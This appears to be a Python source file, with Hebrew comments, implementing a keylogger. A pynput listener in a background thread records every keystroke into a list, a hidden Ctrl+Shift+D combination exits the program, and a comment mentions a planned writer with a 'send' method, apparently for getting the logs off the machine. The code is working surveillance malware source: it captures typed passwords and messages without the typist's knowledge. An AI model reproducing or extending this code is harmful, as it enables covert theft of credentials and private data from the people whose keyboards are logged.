from abc import ABC,abstractmethod
from pynput.keyboard import Key,Listener
import threading
import os


class IKeyLogger(ABC):
    """Abstract class for Interface KeyLogger
    with start, stop, and get_logged_keys methods."""

    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> list[str]:
        pass


class KeyLogger(IKeyLogger):
    """KeyLogger class that handles the recording of keystrokes."""

    def __init__(self):
        self.arr = list()
        self.shift = False

    def __on_press(self,Key):
        """Handle the event when a key is pressed."""
        key_normalized = KeyLogger.normalize_key(Key)
        # print(key_nise)
        self.arr.append(key_normalized)
        if str(Key) == "Key.shift":
            self.shift = True

        # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
    def __on_release(self,key):
        """Handle the event when a key is released."""
        try:
            if str(key.char) == '\x04' and self.shift:  # Ctrl+D+shift
                print("Exiting...")
                os._exit(0)
            self.shift = False
        except:
            self.shift = False

    # אחראי ליפות את המקש
    @staticmethod
    def normalize_key(key):
        """Normalize the key to a readable format."""
        key_str = str(key)
        key_list = list(key_str)
        if len(key_list) > 3:
            key_str = ""
            for i in key_list[4:]:
                key_str += i
            key_str = " " + key_str + " "
            if key_str == " space ":
                return " "
            # if key_nise == " enter ":
            #     return "\n"
            # זה מוכן למקרה שארצה לעשות שימוש במקשים מיוחדים
            return key_str
        else:
            return key_list[1]

    # מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
    def start_logging(self):
        """Start logging keystrokes in a separate thread."""
        def _statr():
            with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
                self.listener = listener
                self.listener.join()
        ran = threading.Thread(target=_statr)
        ran.start()

    def stop_logging(self) -> None:
        """Stop logging keystrokes."""
        os._exit(0)

    def get_logged_keys(self) -> list[str]:
        """Get the list of logged keys and reset the internal list."""
        logged_keys = self.arr.copy()
        self.arr = []
        return logged_keys


shift = False
